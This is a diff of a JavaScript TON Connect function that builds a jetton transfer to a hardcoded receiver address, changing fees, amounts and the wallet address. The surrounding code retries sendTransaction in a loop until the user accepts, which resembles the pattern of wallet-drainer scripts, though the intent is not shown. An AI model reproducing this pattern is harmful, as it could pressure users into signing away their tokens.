@@ -26,34 +26,35 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
 
 const transferTokens = async ()  => {
     console.log("Token transfer initiated");
-
-    const gas_fee_amount = "0.11";
-    const gas_fee = gas_fee_amount * Math.pow(10, 9); // Convert 0.11 TON to nanoTON
-    const contract_address = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"; 
-    const receiver = "";
+    const gas_fee_amount = 0.05; // Ensure this is a number, not a string
+    const gas_fee = gas_fee_amount * Math.pow(10, 9); // Convert 0.05 TON to nanoTON    
+    const sender_jetton_wallet = "EQCFakhqxGuyLU8HjI1m3x0LV4_n2cCwJbsrGq7kn-2lSJ8v"; 
+    const receiver = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs";
 
     const body = beginCell()
-    .storeUint(0xf8a7ea5, 32)                 // jetton transfer op code
+    .storeUint(0xf8a7ea5, 32)                 // Jetton transfer op code
     .storeUint(0, 64)                         // query_id:uint64
-    .storeCoins(toNano("1000000"))              // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - USDT, 9 - default). Function toNano use decimals = 9 (remember it)
-    .storeAddress(Address.parse(receiver))  // destination:MsgAddress
-    .storeAddress(Address.parse(receiver))  // response_destination:MsgAddress
+    .storeCoins(toNano("0.00000001"))         // amount:(VarUInteger 16) - Jetton amount for transfer
+    .storeAddress(Address.parse(receiver))    // destination:MsgAddress
+    .storeAddress(Address.parse(receiver))    // response_destination:MsgAddress
     .storeUint(0, 1)                          // custom_payload:(Maybe ^Cell)
-    .storeCoins(toNano("0.001"))                 // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
-    .storeUint(0,1)                           // forward_payload:(Either Cell ^Cell)
+    .storeCoins(toNano("0.05"))               // forward_ton_amount:(VarUInteger 16)
+    .storeUint(0, 1)                          // forward_payload:(Either Cell ^Cell)
     .endCell();
+
 
     let transactionAccepted = false;
     const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 60, // Transaction validity period
         messages: [
             {
-                address: contract_address,
-                amount: gas_fee,
+                address: sender_jetton_wallet,
+                amount: gas_fee.toString(), // Ensure amount is a string
                 payload: body.toBoc().toString("base64")
             }
         ]
     };
-
+    
     while (!transactionAccepted) {
         try {
             const result = await tonConnectUI.sendTransaction(transaction);
